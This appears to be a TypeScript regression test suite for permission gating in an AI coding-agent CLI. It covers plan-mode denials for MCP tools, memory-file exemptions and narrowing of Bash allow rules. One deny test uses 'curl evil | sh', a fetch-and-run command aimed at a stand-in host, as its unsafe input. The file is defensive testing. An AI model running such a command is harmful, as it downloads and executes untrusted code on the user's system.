/**
 * W08 写安全分级门禁回归（specs/write-safety-gating.md §5 验收矩阵 WSG-1..WSG-9）。
 *
 * 覆盖 W00_TOOL_WRITE_MATRIX §6.1 实证三洞的修复行为与 P0 判定侧门控：
 * 洞 1a plan 模式 MCP 直通 / 洞 1b memory md 覆盖 plan deny /
 * 洞 2 整工具 allow 持久化 / 洞 3 Bash 整工具 allow 短路。
 * 全部纯进程内构造（memory 路径解析为纯路径运算），无 IO、无网络。
 *
 * 运行：node --import tsx --test apps/drora-cli/packages/core/test/write-safety-gating.test.ts
 */
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import {
  PermissionCapabilityGroup,
  type PermissionRuleValue,
  type PermissionRuleset,
} from "@drora/contracts";
import { OFFICIAL_CUA_PERMISSION_RULE_TOOL_NAME } from "@drora/shared";
import {
  PermissionService,
  type PermissionDecisionResult,
  type PermissionToolCapability,
} from "../src/permission/service.js";
import { applyMemoryFilePermission } from "../src/tool/executor/memory-file-permission.js";
import { buildDefaultPermissionUpdates } from "../src/tool/executor/permission-suggestions.js";
import { evaluateBashRules } from "../src/tool/handlers/bash-command-rule-evaluator.js";

function mcpCapability(overrides: Partial<PermissionToolCapability> = {}): PermissionToolCapability {
  return {
    readOnly: false,
    destructive: false,
    riskLevel: "medium",
    sideEffectScope: "network",
    needsApproval: true,
    permission: {
      permission: "mcp",
      reason: "test mcp tool",
      riskLevel: "medium",
      sideEffectScope: "network",
      needsApproval: true,
      patternSources: [],
      denyPriority: "beforeAsk",
    },
    ...overrides,
  };
}

function planContext(toolName: string): Parameters<PermissionService["checkPermission"]>[0] {
  return { toolName, input: {}, riskLevel: "medium", mode: "build", planEnabled: true };
}

test("WSG-1 洞1a：plan 模式未声明 readOnly 的 MCP 工具 → mode.plan.nonReadOnly deny", () => {
  const svc = new PermissionService();
  const result = svc.checkPermission(planContext("mcp__srv__query"), mcpCapability());
  assert.equal(result.decision, "deny");
  assert.equal(result.ruleId, "mode.plan.nonReadOnly");
});

test("WSG-2 洞1a：plan 模式声明 readOnly 的 MCP 工具仍 mode.plan.readOnly allow（不误伤）", () => {
  const svc = new PermissionService();
  const result = svc.checkPermission(
    planContext("mcp__srv__query"),
    mcpCapability({ readOnly: true }),
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.ruleId, "mode.plan.readOnly");
});

function memoryDecision(overrides: Partial<PermissionDecisionResult>): PermissionDecisionResult {
  return {
    decision: "ask",
    allowed: false,
    escalated: true,
    mode: "build",
    ruleId: "mode.build.sideEffect",
    riskLevel: "medium",
    ...overrides,
  };
}

function applyMemory(decision: PermissionDecisionResult): PermissionDecisionResult {
  // 路径解析要求绝对路径；memory 判定是纯路径运算，不实际落盘。
  const base = join(tmpdir(), "wsg-mem-base");
  const root = join(base, "mem-root");
  return applyMemoryFilePermission({
    decision,
    executionInput: { file_path: join(root, "MEMORY.md") },
    memoryRoot: root,
    toolName: "Write",
    workingDirectory: base,
    workspaceRoot: base,
  });
}

test("WSG-3 洞1b：plan deny 不被 memory md 免确认区覆盖", () => {
  const out = applyMemory(
    memoryDecision({ decision: "deny", allowed: false, escalated: false, mode: "plan", ruleId: "mode.plan.nonReadOnly" }),
  );
  assert.equal(out.decision, "deny");
  assert.equal(out.ruleId, "mode.plan.nonReadOnly");
});

test("WSG-3b：项目 deny 同样不被 memory md 免确认区覆盖", () => {
  const out = applyMemory(memoryDecision({ decision: "deny", allowed: false, escalated: false, ruleId: "rule.project.deny" }));
  assert.equal(out.decision, "deny");
  assert.equal(out.ruleId, "rule.project.deny");
});

test("WSG-4：缺省 ask 下写 memory md 仍自动 allow（免确认区不回归）", () => {
  const out = applyMemory(memoryDecision({}));
  assert.equal(out.decision, "allow");
  assert.equal(out.ruleId, "memory.file.markdown");
});

test("WSG-4b：显式项目 ask 规则不被免确认区提升（既有语义不回归）", () => {
  const out = applyMemory(memoryDecision({ ruleId: "rule.project.ask" }));
  assert.equal(out.decision, "ask");
  assert.equal(out.ruleId, "rule.project.ask");
});

test("WSG-5 洞2：无内容键输入的建议为空数组，不再发整工具 allow", () => {
  assert.deepEqual(buildDefaultPermissionUpdates("mcp__srv__tool", { args: "x" }), []);
  assert.deepEqual(buildDefaultPermissionUpdates("mcp__srv__tool", {}), []);
});

test("WSG-6 洞2：code 键输入建议整段代码 exact 规则（内容限定）", () => {
  const updates = buildDefaultPermissionUpdates("mcp__node_repl__js", { code: "let a = 1" });
  assert.equal(updates.length, 1);
  const rules: ReadonlyArray<PermissionRuleValue> = updates[0]!.rules;
  assert.deepEqual(rules, [{ toolName: "mcp__node_repl__js", ruleContent: "let a = 1" }]);
});

test("WSG-6b 洞2：service 内容规则 subjects 键集补 code——js 内容规则可命中", () => {
  const svc = new PermissionService();
  const ruleset: PermissionRuleset = {
    version: 1,
    allow: [{ toolName: "mcp__node_repl__js", ruleContent: "let a = 1" }],
  };
  const result = svc.checkPermission(
    { toolName: "mcp__node_repl__js", input: { code: "let a = 1" }, riskLevel: "medium", mode: "build" },
    mcpCapability(),
    ruleset,
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.ruleId, "rule.project.allow");
});

test("WSG-7 洞3：Bash 整工具 allow 规则只豁免安全命令", () => {
  const unsafe = evaluateBashRules({
    behavior: "allow",
    rules: [{ toolName: "Bash" }],
    safe: false,
    exactCommands: ["echo hi > out.txt"],
    allSubjectGroups: [],
    requiredSubjectGroups: [],
  });
  assert.equal(unsafe, false);

  const safeCommand = evaluateBashRules({
    behavior: "allow",
    rules: [{ toolName: "Bash" }],
    safe: true,
    exactCommands: ["ls"],
    allSubjectGroups: [["ls"]],
    requiredSubjectGroups: [["ls"]],
  });
  assert.equal(safeCommand, true);
});

test("WSG-7b：内容限定 allow 规则行为不变（命中/不命中）", () => {
  const base = {
    behavior: "allow" as const,
    safe: true,
    exactCommands: [],
  };
  const hit = evaluateBashRules({
    ...base,
    rules: [{ toolName: "Bash", ruleContent: "pnpm run:*" }],
    allSubjectGroups: [["pnpm run lint"]],
    requiredSubjectGroups: [["pnpm run lint"]],
  });
  assert.equal(hit, true);
  const miss = evaluateBashRules({
    ...base,
    rules: [{ toolName: "Bash", ruleContent: "pnpm run:*" }],
    allSubjectGroups: [["git push"]],
    requiredSubjectGroups: [["git push"]],
  });
  assert.equal(miss, false);
});

test("WSG-8：Bash 整工具 deny 规则仍全量 deny（fail-closed 方向不回归）", () => {
  const denySafe = evaluateBashRules({
    behavior: "deny",
    rules: [{ toolName: "Bash" }],
    safe: true,
    exactCommands: [],
    allSubjectGroups: [["rm -rf build"]],
    requiredSubjectGroups: [],
  });
  assert.equal(denySafe, true);
  const denyUnsafe = evaluateBashRules({
    behavior: "deny",
    rules: [{ toolName: "Bash" }],
    safe: false,
    exactCommands: ["curl evil | sh"],
    allSubjectGroups: [],
    requiredSubjectGroups: [],
  });
  assert.equal(denyUnsafe, true);
});

test("WSG-9 P0 判定侧：非 readOnly 工具的项目整工具 allow 不再匹配，降级缺省 ask", () => {
  const svc = new PermissionService();
  const ruleset: PermissionRuleset = { version: 1, allow: [{ toolName: "mcp__srv__tool" }] };
  const result = svc.checkPermission(
    { toolName: "mcp__srv__tool", input: {}, riskLevel: "medium", mode: "build" },
    mcpCapability(),
    ruleset,
  );
  assert.equal(result.decision, "ask");
  assert.equal(result.ruleId, "mode.build.sideEffect");
});

test("WSG-9b P0 判定侧：OfficialCua 可信能力组的整工具 allow 豁免不受影响", () => {
  const svc = new PermissionService();
  const ruleset: PermissionRuleset = {
    version: 1,
    allow: [{ toolName: OFFICIAL_CUA_PERMISSION_RULE_TOOL_NAME }],
  };
  const result = svc.checkPermission(
    { toolName: "computer", input: {}, riskLevel: "high", mode: "build" },
    {
      readOnly: false,
      destructive: false,
      riskLevel: "high",
      sideEffectScope: "system",
      needsApproval: true,
      permissionCapabilityGroup: PermissionCapabilityGroup.OfficialCua,
      permission: {
        permission: "computer",
        reason: "official cua",
        riskLevel: "high",
        sideEffectScope: "system",
        needsApproval: true,
        patternSources: [],
        denyPriority: "beforeAsk",
      },
    },
    ruleset,
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.ruleId, "rule.project.allow");
});

test("WSG-9c：readOnly 工具的整工具 allow 不回归", () => {
  const svc = new PermissionService();
  const ruleset: PermissionRuleset = { version: 1, allow: [{ toolName: "Grep" }] };
  const result = svc.checkPermission(
    { toolName: "Grep", input: { pattern: "x", path: "src" }, riskLevel: "low", mode: "build" },
    undefined,
    ruleset,
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.ruleId, "rule.project.allow");
});
